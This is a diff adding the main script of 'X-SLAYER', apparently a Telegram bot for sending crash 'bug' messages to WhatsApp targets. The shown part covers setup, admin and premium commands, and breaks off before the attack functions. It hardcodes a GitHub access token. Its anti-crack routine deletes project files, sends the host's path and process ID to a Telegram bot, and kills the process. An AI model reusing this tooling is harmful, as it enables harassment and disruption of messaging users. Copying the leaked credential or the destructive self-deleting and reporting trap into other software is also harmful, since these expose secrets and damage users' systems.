@@ -1,0 +1,5822 @@
+const { Telegraf } = require("telegraf");
+const { spawn } = require('child_process');
+const { pipeline } = require('stream/promises');
+const { createWriteStream } = require('fs');
+const fs = require('fs');
+const path = require('path');
+const jid = "0@s.whatsapp.net";
+const vm = require('vm');
+const os = require('os');
+const FormData = require("form-data");
+const https = require("https");
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    downloadContentFromMessage,
+    emitGroupParticipantsUpdate,
+    makeMessagesSocket,
+    fetchLatestWaWebVersion,
+    interactiveMessage,
+    emitGroupUpdate,
+    generateWAMessageContent,
+    generateWAMessage,
+    generateMessageID,
+    makeCacheableSignalKeyStore,
+    generateForwardMessageContent,
+    prepareWAMessageMedia,
+    MessageRetryMap,
+    generateWAMessageFromContent,
+    MediaType,
+    areJidsSameUser,
+    WAMessageStatus,
+    downloadAndSaveMediaMessage,
+    AuthenticationState,
+    GroupMetadata,
+    initInMemoryKeyStore,
+    getContentType,
+    getAggregateVotesInPollMessage,
+    MiscMessageGenerationOptions,
+    useSingleFileAuthState,
+    BufferJSON,
+    WAMessageProto,
+    MessageOptions,
+    WAFlag,
+    nativeFlowMessage,
+    WANode,
+    WAMetric,
+    ChatModification,
+    MessageTypeProto,
+    WALocationMessage,
+    ReconnectMode,
+    WAContextInfo,
+    proto,
+    getButtonType,
+    WAGroupMetadata,
+    ProxyAgent,
+    waChatKey,
+    MimetypeMap,
+    MediaPathMap,
+    WAContactMessage,
+    WAContactsArrayMessage,
+    WAGroupInviteMessage,
+    WATextMessage,
+    WAMessageContent,
+    WAMessage,
+    BaileysError,
+    WA_MESSAGE_STATUS_TYPE,
+    MediaConnInfo,
+    URL_REGEX,
+    WAUrlInfo,
+    WA_DEFAULT_EPHEMERAL,
+    WAMediaUpload,
+    jidDecode,
+    mentionedJid,
+    processTime,
+    Browser,
+    MessageType,
+    Presence,
+    WA_MESSAGE_STUB_TYPES,
+    Mimetype,
+    Browsers,
+    GroupSettingChange,
+    DisconnectReason,
+    WASocket,
+    getStream,
+    WAProto,
+    WAProto_1,
+    baileys,
+    AnyMessageContent,
+    fetchLatestBaileysVersion,
+    extendedTextMessage,
+    relayWAMessage,
+    listMessage,
+    templateMessage,
+  encodeSignedDeviceIdentity,
+  encodeWAMessage,
+  jidEncode,
+  patchMessageBeforeSending,
+  encodeNewsletterMessage,
+} = require("@whiskeysockets/baileys");
+const pino = require('pino');
+const crypto = require('crypto');
+const chalk = require('chalk');
+const { tokenBot, ownerID } = require("./settings/config");
+const axios = require('axios');
+const moment = require('moment-timezone');
+const EventEmitter = require('events')
+const makeInMemoryStore = ({ logger = console } = {}) => {
+const ev = new EventEmitter()
+
+  let chats = {}
+  let messages = {}
+  let contacts = {}
+
+  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
+    for (const msg of newMessages) {
+      const chatId = msg.key.remoteJid
+      if (!messages[chatId]) messages[chatId] = []
+      messages[chatId].push(msg)
+
+      if (messages[chatId].length > 100) {
+        messages[chatId].shift()
+      }
+
+      chats[chatId] = {
+        ...(chats[chatId] || {}),
+        id: chatId,
+        name: msg.pushName,
+        lastMsgTimestamp: +msg.messageTimestamp
+      }
+    }
+  })
+
+  ev.on('chats.set', ({ chats: newChats }) => {
+    for (const chat of newChats) {
+      chats[chat.id] = chat
+    }
+  })
+
+  ev.on('contacts.set', ({ contacts: newContacts }) => {
+    for (const id in newContacts) {
+      contacts[id] = newContacts[id]
+    }
+  })
+
+  return {
+    chats,
+    messages,
+    contacts,
+    bind: (evTarget) => {
+      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
+      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
+      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
+    },
+    logger
+  }
+}
+
+const OWNER = "balzyy21"; 
+const REPO = "security";
+const TOKEN_FILE = "tokens.json"; 
+const GITHUB_TOKEN = "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";
+
+const databaseUrl = `https://raw.githubusercontent.com/balzyy21/security/refs/heads/main/tokens.json`;
+
+  const thumbnailUrl = "https://files.catbox.moe/vo9gtp.jpg"; // FOTO PAS Kirim Bug
+  
+  const StartUrl = "https://raw.githubusercontent.com/IkyyExecutive-v2/IkyySukaNgewe/main/uploads/1772285260821_42903_1772285259989_file_1263.mp4"; // FOTO PAS START
+  
+  const menuUrl = "https://files.catbox.moe/vo9gtp.jpg"; // FOTO MENU
+  
+  const bugUrl = "https://files.catbox.moe/vo9gtp.jpg"; // FOTO MENU BUG
+  
+  const toolsUrl = "https://files.catbox.moe/vo9gtp.jpg"; // FOTO TOOLS
+  
+  const tqtoUrl = "https://files.catbox.moe/vo9gtp.jpg"; // FOTO TQTO
+  
+  const attackUrl = "https://files.catbox.moe/vo9gtp.jpg"; // FOTO PAS BERES BUG
+
+function createSafeSock(sock) {
+  let sendCount = 0
+  const MAX_SENDS = 500
+  const normalize = j =>
+    j && j.includes("@")
+      ? j
+      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+
+  return {
+    sendMessage: async (target, message) => {
+      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
+      const jid = normalize(sock, target)
+      return await sock.sendMessage(jid, message)
+    },
+    relayMessage: async (target, messageObj, opts = {}) => {
+      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
+      const jid = normalize(sock, target)
+      return await sock.relayMessage(jid, messageObj, opts)
+    },
+    presenceSubscribe: async jid => {
+      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
+    },
+    sendPresenceUpdate: async (state,jid) => {
+      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
+    }
+  }
+}
+
+function enableBypassProtection() {
+  const { env, execArgv } = process;
+
+  function deleteFilesOnCrack() {
+    const files = [
+      "package.json",
+      "index.js",
+      "config.js",
+      ".npm",
+      "node_modules",
+      "settings",
+      "X-SLAYER New.zip"
+    ];
+    for (const file of files) {
+      try {
+        const targetPath = path.join(process.cwd(), file);
+        if (fs.existsSync(targetPath)) {
+          fs.unlinkSync(targetPath);
+          console.log(`[SECURITY] File dihapus: ${file}`);
+        }
+      } catch (err) {
+        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
+      }
+    }
+  }
+  async function reportToTelegram(reason) {
+    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*
+
+📂 Path: ${process.cwd()}
+🖥️ Node: ${process.version}
+PID: ${process.pid}
+Reason: ${reason}`;
+
+    try {
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: REPORT_CHAT_ID,
+        text,
+        parse_mode: "Markdown"
+      });
+      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
+    } catch (err) {
+      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
+    }
+  }
+
+  const trueAbort = process.abort;
+  const trueExit = process.exit;
+  const trueToString = Function.prototype.toString.toString();
+
+  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
+  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });
+
+  Object.freeze(Function.prototype);
+  Object.freeze(axios.interceptors.request);
+  Object.freeze(axios.interceptors.response);
+
+  function onCrackDetected(reason) {
+    console.error(`[SECURITY] ${reason}`);
+    reportToTelegram(reason);
+    deleteFilesOnCrack();
+    process.kill(process.pid, "SIGKILL");
+  }
+
+  if (Function.prototype.toString.toString() !== trueToString) {
+    onCrackDetected("Function.prototype.toString dibajak");
+  }
+
+  if (execArgv.length === 0 && process.execArgv !== execArgv) {
+    onCrackDetected("process.execArgv dipalsukan");
+  }
+
+  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
+    if (env[key] && env[key] !== "" && env[key] !== "1") {
+      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
+    }
+  });
+
+  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
+    onCrackDetected("Interceptor axios terdeteksi");
+  }
+
+  try {
+    if (typeof module._load === "function") {
+      const moduleCode = module._load.toString();
+      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
+        onCrackDetected("Module._load dibajak");
+      }
+    }
+  } catch (err) {
+    onCrackDetected("Gagal akses module._load: " + err.message);
+  }
+
+  try {
+    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
+    if (typeof trap === "function") {
+      onCrackDetected("require.cache diproxy");
+    }
+  } catch {
+    onCrackDetected("require.cache error");
+  }
+
+  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY BalzyOffc ACTIVE 🔥\n");
+}
+
+function activateSecureMode() {
+  secureMode = true;
+}
+
+(function() {
+  function randErr() {
+    return Array.from({ length: 12 }, () =>
+      String.fromCharCode(33 + Math.floor(Math.random() * 90))
+    ).join("");
+  }
+
+  setInterval(() => {
+    const start = performance.now();
+    debugger;
+    if (performance.now() - start > 100) {
+      throw new Error(randErr());
+    }
+  }, 1000);
+
+  const code = "AlwaysProtect";
+  if (code.length !== 13) {
+    throw new Error(randErr());
+  }
+
+  function secure() {
+    console.log(chalk.bold.blue(`
+╭─❖──────────────────────────❖─╮
+│   X-SLAYER IS HERE !!!       
+├───────────────────────────────
+│⟢ WAITING...... 
+╰─❖──────────────────────────❖─╯
+  `))
+  }
+  
+  const hash = Buffer.from(secure.toString()).toString("base64");
+  setInterval(() => {
+    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
+      throw new Error(randErr());
+    }
+  }, 2000);
+
+  secure();
+})();
+
+(() => {
+  const hardExit = process.exit.bind(process);
+  Object.defineProperty(process, "exit", {
+    value: hardExit,
+    writable: false,
+    configurable: false,
+    enumerable: true,
+  });
+
+  const hardKill = process.kill.bind(process);
+  Object.defineProperty(process, "kill", {
+    value: hardKill,
+    writable: false,
+    configurable: false,
+    enumerable: true,
+  });
+
+  setInterval(() => {
+    try {
+      if (process.exit.toString().includes("Proxy") ||
+          process.kill.toString().includes("Proxy")) {
+        console.log(chalk.bold.red(`
+⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
+⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
+⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
+⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
+⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
+⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
+⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
+⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
+⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
+⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+╭─❖──────────────────────────❖─╮
+│   X-SLAYER IS HERE !!!       
+├───────────────────────────────
+│⟢ DETECTED BYPASS!!!        
+╰─❖──────────────────────────❖─╯
+  `))
+        activateSecureMode();
+        hardExit(1);
+      }
+
+      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
+        if (process.listeners(sig).length > 0) {
+          console.log(chalk.bold.blue(`
+╭─❖──────────────────────────❖─╮
+│   MELACAK KEBERADAAN ANDA.        
+├───────────────────────────────
+│⟢ BALZY NEW ERA
+╰─❖──────────────────────────❖─╯
+  `))
+        activateSecureMode();
+        hardExit(1);
+        }
+      }
+    } catch {
+      activateSecureMode();
+      hardExit(1);
+    }
+  }, 2000);
+
+  global.validateToken = async (databaseUrl, tokenBot) => {
+  try {
+    const res = await axios.get(databaseUrl, { timeout: 5000 });
+    const tokens = (res.data && res.data.tokens) || [];
+
+    if (!tokens.includes(tokenBot)) {
+      console.log(chalk.bold.blue(`
+╭─❖──────────────────────────❖─╮
+│   ⚒️  DETECT INFLATOR  ⚒️
+├───────────────────────────────
+│⟢ 🔴 YOUR TOKEN IS NOT IN THE DATABASE.  
+╰─❖──────────────────────────❖─╯
+  `));
+
+      try {
+      } catch (e) {
+      }
+
+      activateSecureMode();
+      hardExit(1);
+    }
+  } catch (err) {
+    console.log(chalk.bold.blue(`
+╭─❖──────────────────────────❖─╮
+│   ACCES ANDA DI TOLAK !!!
+├───────────────────────────────
+│⟢ MENGHUBUNGI BALZY ☎️
+╰─❖──────────────────────────❖─╯
+  `));
+    activateSecureMode();
+    hardExit(1);
+  }
+};
+})();
+
+const question = (query) => new Promise((resolve) => {
+    const rl = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+    rl.question(query, (answer) => {
+        rl.close();
+        resolve(answer);
+    });
+});
+
+async function isAuthorizedToken(token) {
+    try {
+        const res = await axios.get(databaseUrl);
+        const authorizedTokens = res.data.tokens;
+        return authorizedTokens.includes(token);
+    } catch (e) {
+        return false;
+    }
+}
+
+(async () => {
+    await validateToken(databaseUrl, tokenBot);
+})();
+
+const bot = new Telegraf(tokenBot);
+let tokenValidated = false;
+bot.use((ctx, next) => {
+  if (secureMode) return;
+  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
+  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";
+
+  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
+  const isStartCallback = typeof cbData === "string" && cbData === "/start";
+
+  if (!tokenValidated && !(isStartText || isStartCallback)) {
+    if (ctx.callbackQuery) {
+      try { ctx.answerCbQuery("🔒 ☇ Akses terkunci — validasi token lewat /start <token>"); } catch (e) {}
+    }
+    return ctx.reply("🔒 ☇ Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
+  }
+  return next();
+});
+
+let secureMode = false;
+let sock = null;
+let isWhatsAppConnected = false;
+let linkedWhatsAppNumber = '';
+let lastPairingMessage = null;
+const usePairingCode = true;
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+const premiumFile = './database/premium.json';
+const cooldownFile = './database/cooldown.json'
+
+const loadPremiumUsers = () => {
+    try {
+        const data = fs.readFileSync(premiumFile);
+        return JSON.parse(data);
+    } catch (err) {
+        return {};
+    }
+};
+
+const savePremiumUsers = (users) => {
+    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
+};
+
+const addPremiumUser = (userId, duration) => {
+    const premiumUsers = loadPremiumUsers();
+    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
+    premiumUsers[userId] = expiryDate;
+    savePremiumUsers(premiumUsers);
+    return expiryDate;
+};
+
+const removePremiumUser = (userId) => {
+    const premiumUsers = loadPremiumUsers();
+    delete premiumUsers[userId];
+    savePremiumUsers(premiumUsers);
+};
+
+const isPremiumUser = (userId) => {
+    const premiumUsers = loadPremiumUsers();
+    if (premiumUsers[userId]) {
+        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
+        if (moment().isBefore(expiryDate)) {
+            return true;
+        } else {
+            removePremiumUser(userId);
+            return false;
+        }
+    }
+    return false;
+};
+
+const loadCooldown = () => {
+    try {
+        const data = fs.readFileSync(cooldownFile)
+        return JSON.parse(data).cooldown || 5
+    } catch {
+        return 5
+    }
+}
+
+const saveCooldown = (seconds) => {
+    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
+}
+
+let cooldown = loadCooldown()
+const userCooldowns = new Map()
+
+function formatRuntime() {
+  let sec = Math.floor(process.uptime());
+  let hrs = Math.floor(sec / 3600);
+  sec %= 3600;
+  let mins = Math.floor(sec / 60);
+  sec %= 60;
+  return `${hrs}h ${mins}m ${sec}s`;
+}
+
+function formatMemory() {
+  const usedMB = process.memoryUsage().rss / 1024 / 1024;
+  return `${usedMB.toFixed(0)} MB`;
+}
+
+const startSesi = async () => {
+console.clear();
+  console.log(chalk.red(`
+█░█
+▄▀▄
+▀░▀
+▄▀▀ █░░ ▄▀▄ █░█ █▀ █▀▀▄
+░▀▄ █░░ █▀█ ▀▄▀ █▀ █▐█▀
+▀▀░ ▀▀▀ ▀░▀ ░▀░ ▀▀ ▀░▀▀
+
+`));
+
+  console.log(chalk.green(`
+» Information : t.me/balzyy21
+☇ Inventor    : ucuppsuper
+☇ Name Script : X-SLAYER
+☇ Version     : 3.0 Private
+☇ Status      : BOT AKTIF
+`));
+    
+const store = makeInMemoryStore({
+  logger: require('pino')().child({ level: 'silent', stream: 'store' })
+})
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    const { version } = await fetchLatestBaileysVersion();
+
+    const connectionOptions = {
+        version,
+        keepAliveIntervalMs: 30000,
+        printQRInTerminal: !usePairingCode,
+        logger: pino({ level: "silent" }),
+        auth: state,
+        browser: ['Mac OS', 'Safari', '10.15.7'],
+        getMessage: async (key) => ({
+            conversation: 'Always Prime',
+        }),
+    };
+
+    sock = makeWASocket(connectionOptions);
+    
+    sock.ev.on("messages.upsert", async (m) => {
+        try {
+            if (!m || !m.messages || !m.messages[0]) {
+                return;
+            }
+
+            const msg = m.messages[0]; 
+            const chatId = msg.key.remoteJid || "Tidak Diketahui";
+
+        } catch (error) {
+        }
+    });
+
+    sock.ev.on('creds.update', saveCreds);
+    store.bind(sock.ev);
+    
+    sock.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === 'open') {
+        
+        if (lastPairingMessage) {
+        const connectedMenu = `
+<blockquote> ⬡═―—⊱ ⎧ X-SLAYER ⎭ ⊰―—═⬡
+𖤓 Number: ${lastPairingMessage.phoneNumber}
+𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
+𖤓 Status: Connected
+</blockquote>`;
+
+        try {
+          bot.telegram.editMessageCaption(
+            lastPairingMessage.chatId,
+            lastPairingMessage.messageId,
+            undefined,
+            connectedMenu,
+            { parse_mode: "HTML" }
+          );
+        } catch (e) {
+        }
+      }
+      
+            console.clear();
+            isWhatsAppConnected = true;
+            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
+            console.log(chalk.bold.blue(`
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
+⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
+⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
+⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
+⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
+`));
+console.log(chalk.bold.red(`
+╭─❖──────────────────────────❖─╮
+│ Developer : BalzyOffc   
+│ Version : 3.0 Private
+│ Status : Sender connected 
+├───────────────────────────────
+│⟢ X-SLAYER Starting...
+╰─❖──────────────────────────❖─╯
+  `));
+        }
+
+                 if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            console.log(
+                chalk.red('Koneksi WhatsApp terputus:'),
+                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
+            );
+            if (shouldReconnect) {
+                startSesi();
+            }
+            isWhatsAppConnected = false;
+        }
+    });
+};
+
+startSesi();
+
+let adminUsers = new Set([ownerID.toString()]);
+function isAdminUser(userId) {
+    return adminUsers.has(userId.toString());
+}
+
+function checkAdmin(ctx, next) {
+    if (!isAdminUser(ctx.from.id)) {
+        return ctx.reply("❌ ☇ Akses hanya untuk admin");
+    }
+    next();
+}
+
+const checkWhatsAppConnection = (ctx, next) => {
+    if (!isWhatsAppConnected) {
+        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+        return;
+    }
+    next();
+};
+
+const checkCooldown = (ctx, next) => {
+    const userId = ctx.from.id
+    const now = Date.now()
+
+    if (userCooldowns.has(userId)) {
+        const lastUsed = userCooldowns.get(userId)
+        const diff = (now - lastUsed) / 1000
+
+        if (diff < cooldown) {
+            const remaining = Math.ceil(cooldown - diff)
+            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
+            return
+        }
+    }
+
+    userCooldowns.set(userId, now)
+    next()
+}
+
+const checkPremium = (ctx, next) => {
+    if (!isPremiumUser(ctx.from.id)) {
+        ctx.reply("❌ ☇ Akses hanya untuk premium");
+        return;
+    }
+    next();
+};
+
+bot.command('addadmin', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    
+    const args = ctx.message.text.split(" ");
+    const replyTarget = ctx.message.reply_to_message;
+    
+    let userId = '';
+    
+    if (replyTarget && replyTarget.from) {
+        userId = replyTarget.from.id.toString();
+    } else if (args.length >= 2) {
+        userId = args[1];
+    } else {
+        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
+    }
+    
+    if (!userId || isNaN(userId)) {
+        return ctx.reply("❌ ☇ ID tidak valid");
+    }
+    
+    adminUsers.add(userId);
+    
+    await ctx.reply(
+        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
+        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
+    );
+    
+    try {
+        await ctx.telegram.sendMessage(
+            userId,
+            `🎖️ <b>Anda sekarang Admin X-Slayer!</b>\nAkses: Semua command bot kecuali manage admin`,
+            { parse_mode: "HTML" }
+        );
+    } catch (error) {}
+});
+
+bot.command('deladmin', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    
+    const args = ctx.message.text.split(" ");
+    const replyTarget = ctx.message.reply_to_message;
+    
+    let userId = '';
+    
+    if (replyTarget && replyTarget.from) {
+        userId = replyTarget.from.id.toString();
+    } else if (args.length >= 2) {
+        userId = args[1];
+    } else {
+        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
+    }
+    
+    if (!userId || isNaN(userId)) {
+        return ctx.reply("❌ ☇ ID tidak valid");
+    }
+    
+    if (userId === ownerID.toString()) {
+        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
+    }
+    
+    const wasAdmin = adminUsers.delete(userId);
+    
+    if (wasAdmin) {
+        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
+            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
+    } else {
+        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
+            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
+    }
+});
+
+bot.command('listadmin', checkAdmin, async (ctx) => {
+    let adminList = "👥 <b>Daftar Admin</b>\n\n";
+    let counter = 1;
+    
+    adminUsers.forEach(userId => {
+        adminList += `${counter}. <code>${userId}</code> ${userId === ownerID.toString() ? '👑' : '👨‍💼'}\n`;
+        counter++;
+    });
+    
+    adminList += `\nTotal: ${adminUsers.size} admin`;
+    await ctx.reply(adminList, { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
+});
+
+function getPremiumUsers() {
+    const premiumPath = path.join(__dirname, 'database', 'premium.json');
+    
+    try {
+        if (fs.existsSync(premiumPath)) {
+            const data = JSON.parse(fs.readFileSync(premiumPath, 'utf8'));
+            
+            if (typeof data === 'object' && !Array.isArray(data)) {
+                return Object.entries(data).map(([userId, expiryDate]) => ({
+                    userId,
+                    expiryDate
+                }));
+            }
+            
+            else if (Array.isArray(data)) {
+                return data;
+            }
+        } else {
+            console.log("File premium.json tidak ditemukan di", premiumPath);
+        }
+    } catch (error) {
+        console.error("Error membaca premium.json:", error);
+    }
+    return [];
+}
+
+bot.command('listprem', checkAdmin, async (ctx) => {
+    const premiumUsers = getPremiumUsers();
+    
+    if (!premiumUsers || premiumUsers.length === 0) {
+        return ctx.reply("📭 Tidak ada user premium");
+    }
+    
+    let premList = "🌟 <b>Daftar User Premium</b>\n\n";
+    
+    premiumUsers.forEach((user, index) => {
+        const userId = user.userId || user.id || "N/A";
+        const expiry = user.expiryDate || user.expiry || "Unknown";
+        
+        // Cek apakah expired
+        let status = "✅ Active";
+        try {
+            const expiryDate = new Date(expiry);
+            if (new Date() > expiryDate) {
+                status = "❌ Expired";
+            }
+        } catch (e) {}
+        
+        premList += `${index + 1}. <code>${userId}</code>\n`;
+        premList += `   • Berakhir: ${expiry}\n`;
+        premList += `   • Status: ${status}\n\n`;
+    });
+    
+    premList += `Total: ${premiumUsers.length} user premium`;
+    
+    await ctx.reply(premList, { 
+        parse_mode: "HTML",
+        reply_to_message_id: ctx.message.message_id 
+    });
+});
+
+bot.command('addprem', async (ctx) => {
